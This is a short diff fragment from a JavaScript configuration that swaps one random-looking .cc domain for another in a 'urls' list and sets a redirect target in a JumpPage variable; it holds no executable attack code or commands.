@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-        'tpujuclp.cc/',
+        'gieiciwk.cc/',
 ];
                                                                                                                   
 var JumpPage="https://18hl7.com";
